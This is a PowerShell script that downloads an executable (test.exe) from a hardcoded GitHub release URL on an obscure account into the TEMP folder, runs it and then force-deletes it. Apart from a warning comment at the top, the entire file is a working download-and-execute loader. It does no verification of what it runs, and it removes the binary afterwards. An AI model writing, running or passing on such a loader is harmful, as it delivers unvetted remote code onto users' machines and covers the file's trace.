# WARNING: EXECUTES DOWNLOADED CODE. USE WITH EXTREME CAUTION.

$HardcodedUrl = "https://github.com/kagagagag/html/releases/download/test/test.exe"

# --- Determine Filename from URL ---
try {
    $Uri = [System.Uri]$HardcodedUrl
    $FileNameFromUrl = $Uri.Segments[-1]
    if ([string]::IsNullOrWhiteSpace($FileNameFromUrl)) {
        $FileNameFromUrl = "downloaded_file_$(Get-Random).tmp"
        Write-Warning "Could not determine filename from URL, using random name: $FileNameFromUrl"
    }
} catch {
    Write-Error "Invalid URL format: $HardcodedUrl - Cannot determine filename."
    exit 1
}

$downloadPath = Join-Path $env:TEMP $FileNameFromUrl

# --- Main Logic ---
try {
    Write-Host "Attempting to download file from '$HardcodedUrl' to '$downloadPath'..."
    Invoke-WebRequest -Uri $HardcodedUrl -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
    Write-Host "Download successful."

    if (Test-Path $downloadPath) {
        Write-Host "Executing '$downloadPath' using call operator (&)..."
        # --- CHANGE HERE: Use call operator instead of Start-Process ---
        & $downloadPath
        # Note: Using '&' might not wait for the process to finish by default
        # depending on what the .exe does. If waiting is essential,
        # Start-Process might be needed, but it's the likely cause of the issue.
        # You might need more advanced techniques to wait if '&' returns immediately.
        Write-Host "Execution command issued."
    } else {
        Write-Error "Downloaded file not found at '$downloadPath'. Cannot execute."
        return
    }

} catch {
    Write-Error "An error occurred: $($_.Exception.Message)"
} finally {
    # Delay slightly before deletion to allow the process started with '&' to potentially release file locks
    Start-Sleep -Seconds 5

    if (Test-Path $downloadPath) {
        Write-Host "Attempting to permanently delete '$downloadPath'..."
        try {
            Remove-Item -Path $downloadPath -Force -ErrorAction Stop
            Write-Host "'$downloadPath' deleted successfully."
        } catch {
            Write-Error "Failed to delete '$downloadPath': $($_.Exception.Message)"
            Write-Warning "You may need to delete the file manually from '$env:TEMP'."
        }
    } else {
        Write-Host "'$downloadPath' not found for deletion (may not have downloaded or already deleted)."
    }
}

Write-Host "Script finished."
